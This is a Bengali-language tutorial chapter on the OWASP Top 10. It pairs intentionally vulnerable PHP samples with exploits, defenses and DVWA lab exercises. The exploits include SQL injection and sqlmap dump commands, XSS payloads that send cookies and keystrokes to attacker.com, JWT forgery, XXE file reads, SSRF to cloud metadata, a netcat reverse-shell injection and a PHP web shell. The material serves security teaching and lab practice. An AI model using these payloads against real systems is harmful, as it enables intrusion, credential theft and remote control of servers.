# অধ্যায় ২৪: OWASP Top 10 (প্রতিটি কোড সহ)

## সহজ কথায়:
OWASP Top 10 = ওয়েব অ্যাপ্লিকেশনের শীর্ষ ১০টি দুর্বলতা। প্রতি বছর update হয়। এগুলা জানা থাকলে ৯০% ওয়েব hack করতে পারবে (legal)।

---

## #1: SQL Injection (SQLi)

SQL Injection = database-এ malicious SQL query inject করা।

### Vulnerable Code (PHP):

```php
<?php
# 🚫 দুর্বল কোড — সরাসরি input query-তে ব্যবহার
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    echo "Login successful!";
} else {
    echo "Login failed!";
}
?>
```

### Exploit:

```bash
# Normal login:
username: admin
password: password123
# Query: SELECT * FROM users WHERE username='admin' AND password='password123'

# SQL Injection:
username: admin' -- 
password: anything
# Query: SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
# → -- comment বাকি query → bypass!
```

### UNION-Based SQLi:

```bash
# Find column count:
' ORDER BY 1-- 
' ORDER BY 2-- 
# ... error হয় যে column পর্যন্ত

# Union select:
' UNION SELECT 1,2,3-- 
# দেখো কোন column output দেখায়

# Extract data:
' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
```

### SQLMap (Automated):

```bash
# Basic:
sqlmap -u "http://target.com/page?id=1" --dbs

# Get tables:
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump data:
sqlmap -u "http://target.com/page?id=1" -D db_name -T users --dump

# Post request (login form):
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs

# Blind SQLi:
sqlmap -u "http://target.com/page?id=1" --technique=B --dbs
```

### Blind SQLi (Boolean-based):

```bash
# True:
' AND 1=1--  → normal response
# False:
' AND 1=2--  → different response

# Extract char by char:
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='b'--
# ... 'p' → true! First char = 'p'
```

### Defense:

```php
<?php
# ✅ Safe code — Prepared Statement (Parameterized Query)
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
?>
```

---

## #2: Broken Authentication

Session hijacking, weak password policy, credential stuffing।

### Session Hijacking:

```bash
# Session token steal (XSS বা sniffing দিয়ে):
document.cookie  # JavaScript দিয়ে cookie পড়া

# Session fixation:
/ page.php?sessionid=abc123
# attacker victim-কে এই link পাঠায় → session hijack
```

### JWT Attack:

```json
// JWT Token
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "user": "admin",
  "role": "user"
}

// Attack: algorithm change to "none"
{
  "alg": "none",
  "typ": "JWT"
}
{ "user": "admin", "role": "admin" }
// → Server verify না করলে → admin access!
```

### Brute Force Protection Bypass:

```bash
# Rate limiting bypass:
# X-Forwarded-For header change
curl -X POST -d "user=admin&pass=test" -H "X-Forwarded-For: 10.0.0.1" http://target/login
curl -X POST -d "user=admin&pass=test" -H "X-Forwarded-For: 10.0.0.2" http://target/login
```

---

## #3: XSS (Cross-Site Scripting)

XSS = JavaScript inject → অন্য user-এর browser-এ code run।

### 3 Types:

| Type | কীভাবে | Persistent? |
|------|--------|-------------|
| **Reflected XSS** | URL-এ inject | না (শুধু ওই request) |
| **Stored XSS** | Database-এ save | হ্যাঁ (সবাই দেখে) |
| **DOM-based XSS** | Client-side JS-এ | হ্যাঁ/না |

### Payload Examples:

```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Cookie thief -->
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>

<!-- 페이지 redirect -->
<script>window.location='http://attacker.com'</script>

<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/k?key=' + e.key)
}
</script>

<!-- Image tag -->
<img src=x onerror=alert(1)>

<!-- SVG -->
<svg onload=alert(1)>

<!-- URL encode -->
%3Cscript%3Ealert(1)%3C/script%3E
```

### Defense:

```php
<?php
// ✅ Output encoding
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// CSP Header (Content Security Policy)
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
?>
```

---

## #4: IDOR (Insecure Direct Object Reference)

IDOR = অন্য user-এর data access করা শুধু ID change করে।

### Vulnerable Example:

```php
<?php
// 🚫 দুর্বল — শুধু ID দিয়ে data দেখায়, owner check করে না
$invoice_id = $_GET['id'];
$query = "SELECT * FROM invoices WHERE id=$invoice_id";
$result = mysqli_query($conn, $query);
// → তুমি 1001 → 1002 change করলেই অন্য user-এর invoice!
?>
```

### Exploit:

```bash
# Normal:
GET /invoice?id=1001  → আমার invoice

# IDOR:
GET /invoice?id=1002  → অন্য user-এর invoice!
GET /invoice?id=1003
GET /invoice?id=1004  # Sequential IDs → enumerate
```

### Defense:

```php
<?php
// ✅ Check ownership
$stmt = $conn->prepare("SELECT * FROM invoices WHERE id=? AND user_id=?");
$stmt->bind_param("ii", $invoice_id, $current_user_id);
?>
```

---

## #5: Security Misconfiguration

Default credentials, directory listing, unnecessary services।

```bash
# Default credentials:
admin:admin
admin:password
root:root
test:test

# Directory listing (Apache):
Options +Indexes  → /images/ → সব file দেখা যায়!

# Check:
curl http://target.com/images/
# Directory listing দেখা গেলে → vulnerability

# Sensitive files:
curl http://target.com/robots.txt
curl http://target.com/.git/config
curl http://target.com/.env
curl http://target.com/backup/
```

---

## #6: Sensitive Data Exposure

Password plain text, credit card unencrypted।

```bash
# Example: API returning password in JSON
GET /api/user/profile
Response: { "user": "admin", "password": "supersecret" }

# Check HTTP (not HTTPS):
# Wireshark-এ traffic readable

# Check encryption:
curl -v http://target.com/login
# → Form action http:// (not https) → password plain text যায়!
```

---

## #7: XXE (XML External Entity)

XML parser-এ malicious entity inject।

### Payload:

```xml
<!-- Normal XML -->
<?xml version="1.0"?>
<user>admin</user>

<!-- XXE — file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>

<!-- XXE — SSRF (internal request) -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>

<!-- XXE — RCE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
```

### Defense:
```php
<?php
libxml_disable_entity_loader(true);  // PHP
?>
```

---

## #8: Broken Access Control

Admin function user-এর কাছে accessible।

```bash
# Check:
GET /admin         → 403 Forbidden
GET /ADMIN         → 200 OK (case sensitivity bypass!)
GET /admin/        → 200 (trailing slash bypass)
GET /admin/..;/..;/admin  → path traversal bypass

# Role check:
POST /api/deleteUser
Cookies: role=user
Change to: Cookies: role=admin
```

---

## #9: SSRF (Server-Side Request Forgery)

Server-কে internal resource-এ request পাঠানো।

```bash
# Vulnerable:
GET /fetch?url=http://example.com

# SSRF — internal service:
GET /fetch?url=http://127.0.0.1:3306
GET /fetch?url=http://localhost:8080/admin
GET /fetch?url=http://169.254.169.254/latest/meta-data/  # AWS metadata

# SSRF — cloud metadata:
GET /fetch?url=http://metadata.google.internal/
GET /fetch?url=http://100.100.100.200/latest/meta-data/
```

---

## #10: Command Injection

OS command inject — most severe।

### Vulnerable Code:

```php
<?php
// 🚫 ping command — input সরাসরি system call-এ
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>
```

### Exploit:

```bash
# Normal:
GET /ping?ip=8.8.8.8

# Command injection:
GET /ping?ip=8.8.8.8;id
GET /ping?ip=8.8.8.8|id
GET /ping?ip=8.8.8.8&&id
GET /ping?ip=$(id)

# Get shell:
GET /ping?ip=8.8.8.8;nc -e /bin/sh 10.0.0.1 4444

# Windows:
GET /ping?ip=127.0.0.1&whoami
GET /ping?ip=127.0.0.1|dir
```

### Web Shell Upload:

```php
<?php
// webshell.php — upload করলেই shell!
system($_GET['cmd']);
?>

<!-- Usage -->
http://target/uploads/webshell.php?cmd=id
http://target/uploads/webshell.php?cmd=cat+/etc/passwd
http://target/uploads/webshell.php?cmd=ls+-la
```

---

## 💡 ল্যাব এক্সারসাইজ

```
DVWA-তে প্রতিটি vulnerability practice করো:

১. SQL Injection:
   - ' OR 1=1--  → login bypass
   - UNION select → data extract
   - sqlmap automate

২. XSS:
   - <script>alert('XSS')</script>
   - Cookie steal (imaginary server)

৩. Command Injection:
   - 127.0.0.1;id
   - webshell upload

৪. File Upload:
   - webshell.php upload
   - Access → shell

৫. DVWA Security Level বাড়াও:
   - Low → Medium → High → Impossible
   - প্রতিটি level-এ bypass চেষ্টা করো
```

---

## 📌 মনে রাখো

| # | Vulnerability | কীভাবে কাজ করে |
|---|--------------|---------------|
| **1** | SQLi | Database query inject |
| **2** | Broken Auth | Session hijack, weak password |
| **3** | XSS | JavaScript inject |
| **4** | IDOR | ID change করে |
| **5** | Misconfig | Default cred, dir listing |
| **6** | Data Exposure | Plain text password |
| **7** | XXE | XML entity inject |
| **8** | Access Control | Admin function accessible |
| **9** | SSRF | Internal server request |
| **10** | Command Inj | OS command |

**পরবর্তী — Advanced Web Attacks (CSRF, File Upload, Buffer Overflow)! ⚔️**
